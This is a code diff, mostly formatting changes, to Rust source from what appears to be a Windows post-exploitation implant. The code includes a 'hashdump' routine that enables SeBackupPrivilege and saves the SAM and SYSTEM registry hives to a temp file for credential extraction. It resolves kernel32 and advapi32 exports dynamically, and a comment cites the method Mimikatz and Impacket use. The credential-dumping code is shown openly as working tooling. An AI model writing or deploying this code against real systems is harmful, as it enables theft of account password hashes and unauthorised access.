@@ -218,7 +218,11 @@ pub fn do_hashdump(rt: Option<&'static Runtime>, method: u8) -> Response {
 pub fn do_hashdump_vec(rt: Option<&'static Runtime>, method: u8) -> Vec<Response> {
     let rt = match rt {
         Some(r) => r,
-        None => return vec![Response::Err(String::from("hashdump: syscall runtime down"))],
+        None => {
+            return vec![Response::Err(String::from(
+                "hashdump: syscall runtime down",
+            ))]
+        }
     };
     let sysroot = system_root();
     match method {
@@ -271,10 +275,11 @@ fn system_root() -> String {
     // GetEnvironmentVariableW; reuse recon's resolution style inline (avoid a
     // cross-module dep just for one var).
     type GetEnvVarW = unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
-    let gev: GetEnvVarW = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"GetEnvironmentVariableW") } {
-        Some(a) => unsafe { core::mem::transmute(a) },
-        None => return String::from("C:\\Windows"),
-    };
+    let gev: GetEnvVarW =
+        match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"GetEnvironmentVariableW") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return String::from("C:\\Windows"),
+        };
     let mut name16 = crate::heap::vec![0u16; 14];
     let nb = b"SystemRoot";
     for (i, &c) in nb.iter().enumerate() {
@@ -343,8 +348,7 @@ unsafe fn enable_privilege(priv_name_wide: &[u16]) -> bool {
     const HKEY_LOCAL_MACHINE: *mut c_void = 0x8000_0002usize as *mut c_void;
 
     type GetCurrentProcess = unsafe extern "system" fn() -> *mut c_void;
-    type OpenProcessToken =
-        unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
+    type OpenProcessToken = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
     type LookupPrivilegeValueW =
         unsafe extern "system" fn(*const u16, *const u16, *mut Luid) -> i32;
     type AdjustTokenPrivileges = unsafe extern "system" fn(
@@ -377,10 +381,11 @@ unsafe fn enable_privilege(priv_name_wide: &[u16]) -> bool {
             Some(a) => unsafe { core::mem::transmute(a) },
             None => return false,
         };
-    let close: CloseHandle = match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") } {
-        Some(a) => unsafe { core::mem::transmute(a) },
-        None => return false,
-    };
+    let close: CloseHandle =
+        match unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return false,
+        };
 
     let mut luid = Luid { low: 0, high: 0 };
     if unsafe { lpv(core::ptr::null(), priv_name_wide.as_ptr(), &mut luid) } == 0 {
@@ -396,7 +401,16 @@ unsafe fn enable_privilege(priv_name_wide: &[u16]) -> bool {
         luid,
         attributes: SE_PRIVILEGE_ENABLED,
     };
-    let ok = unsafe { atp(htok, 0, &tp, 0, core::ptr::null_mut(), core::ptr::null_mut()) };
+    let ok = unsafe {
+        atp(
+            htok,
+            0,
+            &tp,
+            0,
+            core::ptr::null_mut(),
+            core::ptr::null_mut(),
+        )
+    };
     let _ = close(htok);
     // Touch HKEY_LOCAL_MACHINE to silence unused-const warning path; harmless.
     let _ = HKEY_LOCAL_MACHINE;
@@ -408,18 +422,18 @@ unsafe fn enable_privilege(priv_name_wide: &[u16]) -> bool {
 /// the in-memory hive copy (the same path Mimikatz/Impacket use). Returns the
 /// temp-file path on success. `chunk_name` selects the root: "SAM" or "SYSTEM".
 unsafe fn save_hive_fallback(chunk_name: &str) -> Result<String, i32> {
+    use crate::heap::{vec, String, Vec};
     use crate::resolve::export_addr;
     use core::ffi::c_void;
-    use crate::heap::{vec, String, Vec};
 
     // advapi32: RegOpenKeyExW, RegSaveKeyW. RegSaveKeyW is the simpler variant
     // (no format flag) and is what `reg save` uses under the hood.
     type ForceLoad = unsafe extern "system" fn(*const u8) -> *mut c_void;
     type RegOpenKeyExW = unsafe extern "system" fn(
-        *mut c_void, // hKey (HKEY_LOCAL_MACHINE)
-        *const u16,  // lpSubKey
-        u32,         // ulOptions
-        u32,         // samDesired
+        *mut c_void,      // hKey (HKEY_LOCAL_MACHINE)
+        *const u16,       // lpSubKey
+        u32,              // ulOptions
+        u32,              // samDesired
         *mut *mut c_void, // phkResult
     ) -> i32;
     type RegSaveKeyW = unsafe extern "system" fn(
@@ -455,9 +469,25 @@ unsafe fn save_hive_fallback(chunk_name: &str) -> Result<String, i32> {
 
     // Enable SeBackupPrivilege (required for RegSaveKey even as SYSTEM).
     let backup_wide: [u16; 19] = [
-        b'S' as u16, b'e' as u16, b'B' as u16, b'a' as u16, b'c' as u16, b'k' as u16,
-        b'u' as u16, b'p' as u16, b'P' as u16, b'r' as u16, b'i' as u16, b'v' as u16,
-        b'i' as u16, b'l' as u16, b'e' as u16, b'g' as u16, b'e' as u16, 0, 0,
+        b'S' as u16,
+        b'e' as u16,
+        b'B' as u16,
+        b'a' as u16,
+        b'c' as u16,
+        b'k' as u16,
+        b'u' as u16,
+        b'p' as u16,
+        b'P' as u16,
+        b'r' as u16,
+        b'i' as u16,
+        b'v' as u16,
+        b'i' as u16,
+        b'l' as u16,
+        b'e' as u16,
+        b'g' as u16,
+        b'e' as u16,
+        0,
+        0,
     ];
     let _ = unsafe { enable_privilege(&backup_wide) };
 
@@ -501,7 +531,10 @@ unsafe fn save_hive_fallback(chunk_name: &str) -> Result<String, i32> {
 fn temp_dir() -> Option<String> {
     type GetEnvVarW = unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
     let gev: GetEnvVarW = unsafe {
-        core::mem::transmute(crate::resolve::export_addr(b"kernel32.dll", b"GetEnvironmentVariableW")?)
+        core::mem::transmute(crate::resolve::export_addr(
+            b"kernel32.dll",
+            b"GetEnvironmentVariableW",
+        )?)
     };
     let mut name16 = crate::heap::vec![0u16; 8];
     let nb = b"TEMP";
